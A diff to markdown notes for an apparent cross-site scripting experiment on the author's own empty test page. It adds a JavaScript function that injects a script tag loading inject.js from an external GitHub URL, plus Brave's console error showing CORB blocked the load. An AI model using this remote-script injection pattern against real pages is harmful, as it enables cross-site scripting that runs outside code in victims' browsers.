@@ -7,7 +7,7 @@ The target page must hace JQuery libraries activated
 ## Target paget
 We will use an empty HTML page to host our injection
 
-```
+```html
 <!DOCTYPE html>
 <html lang="en">
 
@@ -37,8 +37,23 @@ We will use an empty HTML page to host our injection
 ## Code to inject
 The golar is to inject the code of this file on the page:
 ```
-https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js"
+https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js
 ```
 
-# First try
+# First try (Brave)
+
+```javascript
+function inject() {
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
+    document.head.appendChild(script);
+}
+inject()
 ```
+
+Result:
+<span style="color: red">
+  VM304:6 Cross-Origin Read Blocking (CORB) blocked cross-origin response https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js with MIME type text/plain. See https://www.chromestatus.com/feature/5629709824032768 for more details.
+  </span>
+
